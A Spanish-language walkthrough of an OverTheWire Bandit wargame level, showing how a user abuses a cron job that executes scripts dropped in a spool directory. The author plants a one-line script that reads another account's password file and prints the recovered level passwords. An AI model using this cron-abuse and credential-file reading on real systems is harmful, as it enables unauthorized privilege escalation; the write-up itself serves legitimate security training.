## Objetivo 
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Datos de acceso
bandit23
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
## Solución
```bash
bandit23@bandit:~$  ls -la /etc/cron.d/
total 56
drwxr-xr-x   2 root root  4096 Oct  5 06:20 .
drwxr-xr-x 106 root root 12288 Oct  5 06:20 ..
-rw-r--r--   1 root root    62 Oct  5 06:19 cronjob_bandit15_root
-rw-r--r--   1 root root    62 Oct  5 06:19 cronjob_bandit17_root
-rw-r--r--   1 root root   120 Oct  5 06:19 cronjob_bandit22
-rw-r--r--   1 root root   122 Oct  5 06:19 cronjob_bandit23
-rw-r--r--   1 root root   120 Oct  5 06:19 cronjob_bandit24
-rw-r--r--   1 root root    62 Oct  5 06:19 cronjob_bandit25_root
-rw-r--r--   1 root root   201 Jan  8  2022 e2scrub_all
-rwx------   1 root root    52 Oct  5 06:20 otw-tmp-dir
-rw-r--r--   1 root root   102 Mar 23  2022 .placeholder
-rw-r--r--   1 root root   396 Feb  2  2021 sysstat
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:~$ cd /var/spool/bandit24/foo
bandit23@bandit:/var/spool/bandit24/foo$ ls -la
ls: cannot open directory '.': Permission denied
bandit23@bandit:/var/spool/bandit24/foo$ mkdir /tmp/passtmp
bandit23@bandit:/var/spool/bandit24/foo$ cd /tmp/passtmp
bandit23@bandit:/tmp/passtmp$ echo "cat /etc/bandit_pass/bandit24 >> /tmp/passtmp/password" > mio.sh
bandit23@bandit:/tmp/passtmp$ chmod 777 mio.sh
bandit23@bandit:/tmp/passtmp$ cat mio.sh
cat /etc/bandit_pass/bandit24 >> /tmp/passtmp/password
bandit23@bandit:/tmp/passtmp$ ls -la mio.sh
-rwxrwxrwx 1 bandit23 bandit23 55 Feb 24 23:59 mio.sh
bandit23@bandit:/tmp/passtmp$ touch password
bandit23@bandit:/tmp/passtmp$ chmod 666 password
bandit23@bandit:/tmp/passtmp$ cp mio.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/passtmp$ ls -la
total 408
drwxrwxr-x   2 bandit23 bandit23   4096 Feb 25 00:00 .
drwxrwx-wt 416 root     root     405504 Feb 25 00:02 ..
-rwxrwxrwx   1 bandit23 bandit23     55 Feb 24 23:59 mio.sh
-rw-rw-rw-   1 bandit23 bandit23      0 Feb 25 00:00 password
bandit23@bandit:/tmp/passtmp$ ls -la
total 408
drwxrwxr-x   2 bandit23 bandit23   4096 Feb 25 00:00 .
drwxrwx-wt 417 root     root     405504 Feb 25 00:02 ..
-rwxrwxrwx   1 bandit23 bandit23     55 Feb 24 23:59 mio.sh
-rw-rw-rw-   1 bandit23 bandit23      0 Feb 25 00:00 password
bandit23@bandit:/tmp/passtmp$ ls -la
total 412
drwxrwxr-x   2 bandit23 bandit23   4096 Feb 25 00:00 .
drwxrwx-wt 417 root     root     405504 Feb 25 00:03 ..
-rwxrwxrwx   1 bandit23 bandit23     55 Feb 24 23:59 mio.sh
-rw-rw-rw-   1 bandit23 bandit23     33 Feb 25 00:03 password
bandit23@bandit:/tmp/passtmp$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
bandit23@bandit:/tmp/passtmp$
```


## Notas
chmod 777 da permisos totales a un archivo
chmod 666 da permisos de escritura y lectura a todos en un archivo

## Referencias
https://www.linuxtotal.com.mx/?cont=info_admon_006
